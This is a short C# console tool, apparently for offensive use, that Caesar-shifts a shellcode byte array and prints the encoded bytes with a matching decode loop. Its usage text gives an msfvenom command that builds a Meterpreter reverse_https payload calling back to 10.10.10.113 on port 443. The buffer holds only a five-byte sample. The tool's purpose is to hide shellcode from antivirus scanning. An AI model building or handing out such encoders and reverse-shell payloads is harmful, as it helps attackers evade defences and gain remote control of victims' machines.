using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace enc0d3r
{
    internal class Program
    {

        static void Main(string[] args)
        {
            

            if (args.Length < 2)
            {
                Console.WriteLine("enc0d3r.exe [encodingType] [arguments]");
                Console.WriteLine("\tcaesar [substitutionKey]");
                Console.WriteLine();
                Console.WriteLine("Dont forget to change the payload buf inside the code. To generate the payload use for example: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.113 LPORT=443 -f csharp");
                return;
            }

            //payload sample not complete follows
            byte[] buf = new byte[5] { 0xfc, 0x48, 0x83, 0xe4, 0xf0 };

            String action = args[0];


            if (action == "caesar")
            {
                Int32 caesarSubstitionKey = int.Parse(args[1]);
                
                byte[] encoded = new byte[buf.Length];
                for (int i = 0; i < buf.Length; i++)
                {
                    encoded[i] = (byte)(((uint)buf[i] + caesarSubstitionKey) & 0xFF);
                }

                StringBuilder hex = new StringBuilder(encoded.Length * 2);
                foreach (byte b in encoded)
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                Console.WriteLine("Ceasar encoded payload:", buf.Length,hex.ToString());
                Console.WriteLine("byte[] buf = new byte[{0}] {1}{2}{3}",buf.Length,"{",hex.ToString().TrimEnd(' ').TrimEnd(','),"}");
                Console.WriteLine();
                Console.WriteLine("Decode snippet:");
                Console.WriteLine("for(int i = 0; i < buf.Length; i++)");
                Console.WriteLine("{");
                Console.WriteLine("\t" + @"buf[i] = (byte)(((uint)buf[i] - " + caesarSubstitionKey + @") & 0xFF);");
                Console.WriteLine("}");


                
            }
        }
    }
}
